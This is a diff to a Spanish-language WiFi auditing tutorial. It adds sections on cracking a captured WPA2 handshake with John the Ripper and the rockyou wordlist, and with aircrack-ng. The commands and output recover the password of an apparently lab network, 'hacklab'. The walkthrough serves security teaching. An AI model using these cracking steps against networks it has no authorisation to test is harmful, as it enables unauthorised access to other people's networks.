@@ -1835,7 +1835,8 @@ prestarle un poco más de atención. Actualmente, **aircrack-ng** cuenta con el 
 para generar un archivo de '**.hccap**'.
 
 ¿Por qué queremos generar un archivo **HCCAP**?, porque luego a través de la herramienta **hccap2john**
-podemos transformar ese archivo a un hash, igual que como haríamos como **ssh2john** u otra utilidad semejante.
+podemos transformar ese archivo a un hash, igual que como haríamos como **ssh2john** u otra utilidad
+semejante.
 
 Por tanto, aquí una demostración:
 
@@ -1907,7 +1908,60 @@ Y eso tan bonito que vemos, es el Hash correspondiente a la contraseña de la re
 sencillamente crackear llegados hasta este punto haciendo uso de la herramienta **John** junto a un diccionario.
 
 
+#### Fuerza bruta con John
 
+Ya habiendo llegado hasta aquí, procedemos con los ataques de fuerza bruta. Aprovechando el punto
+anteriormente visto, ya que contamos con un Hash... resulta sencillo crackear la contraseña de la red WiFi
+haciendo uso de un diccionario a través de la herramienta **John**, de la siguiente forma:
+
+```bash
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #john --wordlist=/usr/share/wordlists/rockyou.txt miHash --format=wpapsk
+Using default input encoding: UTF-8
+Loaded 1 password hash (wpapsk, WPA/WPA2/PMF/PMKID PSK [PBKDF2-SHA1 256/256 AVX2 8x])
+No password hashes left to crack (see FAQ)
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #john --show --format=wpapsk miHash 
+hacklab:vampress1:34-41-5d-46-d1-38:20-34-fb-b1-c5-53:2034fbb1c553::WPA2:miCaptura.hccap
+
+1 password hash cracked, 0 left
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #echo "Password: $(john --show --format=wpapsk miHash | cut -d ':' -f 2)"
+Password: vampress1
+```
+
+Y ahí dispondríamos de la contraseña de la red inalámbrica, que en este caso es **vampress1**.
+
+#### Fuerza bruta con Aircrack
+
+Para crackear nuestro Handshake desde la propia suite de **aircrack**, tan sólo tendríamos que emplear esta
+sintaxis:
+
+* aircrack-ng -w rutaDiccionario Captura-01.cap
+
+Se iniciaría el proceso de fuerza bruta y una vez obtenida se detendría la fase de cracking, mostrando la
+contraseña siempre y cuando esta se encuentre en el diccionario especificado:
+
+```bash
+                              Aircrack-ng 1.5.2 
+
+      [00:00:43] 487370/9822769 keys tested (7440.27 k/s) 
+
+      Time left: 20 minutes, 54 seconds                          4.96%
+
+                           KEY FOUND! [ vampress1 ]
+
+
+      Master Key     : 9C E8 4E 94 F4 08 12 AC 1F 06 C9 5F CF C8 DE D5 
+                       EC 70 5C 4B 73 FE 52 7B 02 29 9F 9A 88 E2 B3 74 
+
+      Transient Key  : C6 21 8D E8 62 DD B2 A7 48 65 52 AA E0 C0 8E 85 
+                       1B 63 D0 1D 9C C0 47 12 DA BF E1 63 12 01 8C 75 
+                       D3 EF AE C5 E4 62 B7 C7 6E DE D1 05 9D 67 81 BF 
+                       E7 94 71 D0 8D FE 92 17 61 AC 44 BA 48 E6 F7 B3 
+
+      EAPOL HMAC     : 1A EB 42 13 85 E4 A1 FC 99 AF AA 97 4D AA EE 25
+```
 
 
 
